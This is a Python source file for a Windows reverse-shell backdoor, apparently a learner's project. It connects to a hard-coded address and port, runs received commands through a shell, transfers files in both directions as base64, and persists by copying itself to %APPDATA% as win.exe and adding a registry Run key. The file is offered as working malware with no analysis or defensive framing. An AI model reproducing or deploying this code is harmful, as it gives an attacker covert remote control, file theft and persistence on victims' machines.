# !/usr/bin/python
import socket
import subprocess # this allow us to input something in the cli
import json
import time
import os
import shutil # screenshot
import sys # use in copy function 
import base64



# trying to retyr the connection
def connection():
	global sock
	while True:
		time.sleep(5)
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 and TCP
			sock.connect(("192.168.88.19", 54321))
			shell()
		except:
			connection()


# we gonna send send and receive data as wew want ==
def reliable_send(data):
        json_data = json.dumps(data)
         # print("testing the json send: "+json_data)
        sock.send(json_data)

def reliable_rcv():
        json_data = ""
        # run loop to add data
        while True:
                try:
                        json_data = json_data + sock.recv(1024)
                        # print("testing the json data receving: " + json_data)
                        # print("print the json loads: "+ json.loads(json_data))
                        return json.loads(json_data)
                except ValueError:
                        # print("reliable_rcv except (continue)..")
                        continue



def shell():
	while True:
		command = reliable_rcv() # receive bytes
		if command  == "q":
			break
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] == "download":
			# file = open(command[9:], "wb")  # you can this also
			with open(command[9:], "rb") as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] == "upload":
	                with open(command[7:], "wb") as fin:
                                result = reliable_rcv()
				fin.write(base64.b64decode(result))
		else:
			try:
				process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
				result = process.stdout.read() + process.stderr.read()
				reliable_send(result)

			except:
				reliable_send("CAN'T EXECUTE THE COMMAND!!!")

location = os.environ["appdata"] + "\\win.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v win /t REG_SZ /d "' + location + '"', shell=True)


connection()
sock.close()
